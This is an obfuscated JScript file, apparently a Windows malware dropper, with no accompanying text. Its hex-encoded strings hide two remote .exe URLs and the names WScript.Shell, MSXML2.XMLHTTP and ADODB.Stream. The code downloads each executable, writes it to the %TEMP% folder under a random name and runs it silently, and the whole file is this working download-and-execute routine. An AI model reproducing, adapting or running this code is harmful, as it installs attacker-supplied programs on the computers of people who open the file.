var NQMznc=""
var qEDFHzZvPBwCAVeRd=["\x68\x74\x74\x70\x3a\x2f\x2f\x61\x6d\x6f\x72\x65\x64\x6f\x6c\x63\x65\x2e\x63\x6f\x6d\x2e\x62\x72\x2f\x74\x30\x66\x41\x53\x4f\x2e\x65\x78\x65","\x68\x74\x74\x70\x3a\x2f\x2f\x6e\x7a\x31\x30\x30\x2e\x63\x6f\x2e\x6e\x7a\x2f\x37\x50\x79\x57\x76\x61\x2e\x65\x78\x65","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a","\x57\x53\x26\x4b\x72\x44\x68\x4e\x4a\x50\x46\x77\x26\x63\x72\x69\x70\x74\x26\x4b\x72\x44\x68\x4e\x4a\x50\x46\x77\x26\x2e\x53\x68\x65\x6c\x6c","\x26","\x4d\x53\x58\x26\x43\x65\x53\x68\x4e\x49\x6a\x71\x6c\x26\x4d\x4c\x32\x2e\x58\x4d\x26\x44\x57\x43\x66\x49\x63\x78\x6a\x6e\x5a\x66\x26\x4c\x48\x54\x54\x50","\x26","\x41\x44\x4f\x44\x42\x26\x48\x6d\x4e\x66\x6b\x56\x50\x43\x66\x26\x2e\x26\x69\x66\x62\x62\x6f\x66\x48\x6d\x69\x26\x53\x74\x72\x65\x61\x6d","\x26","\x2e\x65\x78\x65","\x25\x54\x45\x4d\x50\x25","\x47\x2a\x5a\x55\x63\x4f\x4d\x4b\x76\x5a\x65\x72\x2a\x45\x2a\x54\x2a\x70\x7a\x4d\x66\x67\x74\x55\x54\x55\x6c\x6f\x59","\x2a","\x54\x6a\x79"]

var mZgxg = [qEDFHzZvPBwCAVeRd[0], qEDFHzZvPBwCAVeRd[1]];
function wFoFJFv() {var teDV=100000;var Hyyuij = 100;return Math.random()*(teDV-Hyyuij)+Hyyuij;}
function OWgexhmA(YgNpp) {var wuOUjsRN=qEDFHzZvPBwCAVeRd[2];for(var ZsOrV=0;ZsOrV<YgNpp;ZsOrV++){FxEDS+=wuOUjsRN.charAt(Math.floor(Math.random()*wuOUjsRN.length));}return FxEDS;}
function VBVITIpjY(sOBAdyYsO,WkRXoxQ,EfwGfzsg){
var zcYHlSxao = HhPZG(ehfmG(qEDFHzZvPBwCAVeRd[3],[0,2,4],qEDFHzZvPBwCAVeRd[4]));
var WkRXoxQ = vqXRhy(zcYHlSxao) + String.fromCharCode(92) + WkRXoxQ;
var oybiC = HhPZG(ehfmG(qEDFHzZvPBwCAVeRd[5],[0,2,4],qEDFHzZvPBwCAVeRd[6]));   
pGPm(sOBAdyYsO,oybiC);
if (oybiC.status == 100+100) {
var xbUvdrp = HhPZG(ehfmG(qEDFHzZvPBwCAVeRd[7],[0,2,4],qEDFHzZvPBwCAVeRd[8]));
ADapb(xbUvdrp,oybiC.ResponseBody,WkRXoxQ);
}
if (EfwGfzsg > 0){
zcYHlSxao.Run(WkRXoxQ, 0x1, 0x0);
};
}
for(PYvf=0;PYvf<mZgxg.length;PYvf++) {
try{VBVITIpjY(mZgxg[PYvf], wFoFJFv() + qEDFHzZvPBwCAVeRd[9], 1)}catch(e){}; 
}
function HhPZG(KfhjOC){return new ActiveXObject(KfhjOC);}
function vqXRhy(KfhjOC){return KfhjOC.ExpandEnvironmentStrings(qEDFHzZvPBwCAVeRd[10])}
function ADapb(zanfsKer,UunRq,YMjsMaylDa){zanfsKer.open();zanfsKer.type = 1;zanfsKer.write(UunRq);zanfsKer.position = 0;zanfsKer.saveToFile(YMjsMaylDa, 2);zanfsKer.close();}
function pGPm(NPnIwx,pLwPOvs){Dbko = qEDFHzZvPBwCAVeRd[11].split(qEDFHzZvPBwCAVeRd[12]);pLwPOvs.open(Dbko[0]+Dbko[2]+Dbko[3], NPnIwx, false);pLwPOvs.send();}
function ehfmG(MgbbeAjl,NacKUR,ywdLPTtSS){LzBvL=MgbbeAjl.split(ywdLPTtSS);nVSoghO = qEDFHzZvPBwCAVeRd[13];for(auYZpmpd=0;auYZpmpd<NacKUR.length;auYZpmpd++) {nVSoghO+=LzBvL[NacKUR[auYZpmpd]];}return nVSoghO.substring(3,nVSoghO.length);}
